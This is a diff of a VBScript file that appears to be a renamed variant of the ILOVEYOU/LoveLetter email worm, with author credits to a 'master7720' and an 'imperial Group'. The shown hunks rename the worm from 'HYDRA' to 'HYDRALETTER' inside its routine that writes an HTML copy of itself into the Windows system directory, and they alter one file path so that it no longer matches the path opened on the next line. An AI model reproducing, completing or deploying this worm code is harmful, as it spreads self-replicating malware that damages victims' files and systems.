@@ -1,4 +1,4 @@
-rem  barok -hydra(vbe) <uwu>
+rem  barok -hydraletter(vbe) <uwu>
 rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  On Error Resume Next
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
@@ -206,8 +206,8 @@ rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  sub html
  On Error Resume Next
  dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
- dta1="<HTML><HEAD><TITLE>HYDRA - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
- HYDRA@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
+ dta1="<HTML><HEAD><TITLE>HYDRALETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
+ HYDRALETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
  @imperial Group ?-? LA ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
  CONTENT=@-@simple but i think this its good...@-@>"&vbcrlf& _
  "<?-?HEAD><BODY
@@ -265,7 +265,7 @@ rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  else
  lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
  next
- set b=fso.CreateTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER\HYDRA-SENT-YOU-A-LETTER.HTM") b.close
+ set b=fso.CreateTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER") b.close
  set d=fso.OpenTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER.HTM",2) d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
